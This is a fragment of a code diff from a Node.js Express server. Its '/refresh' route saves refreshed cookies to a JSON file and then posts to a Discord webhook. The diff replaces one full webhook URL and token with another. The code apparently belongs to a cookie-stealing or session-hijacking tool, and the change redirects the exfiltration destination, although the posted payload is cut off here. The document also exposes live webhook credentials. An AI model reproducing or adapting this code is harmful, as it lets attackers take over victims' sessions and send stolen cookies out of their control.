@@ -57,7 +57,7 @@ app.get('/refresh', async (req, res) => {
 
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
 
-    const webhookURL = 'https://discord.com/api/webhooks/1335466750346793053/Ew8D1gXzfaSM4grP-KCMB0EjLVftbVR4a0agfV5LrQHxMYDiP2lvIPBUN3uOY8m4L4Bb';
+    const webhookURL = 'https://discord.com/api/webhooks/1331903865666408539/ctHIdBCiK56HnXCVS7SlTxLUI7e_m294istdRntIGiY1fL9yAM6dxcLBIPSzuebSFunt';
     const response = await axios.post(webhookURL, {
         embeds: [
             {
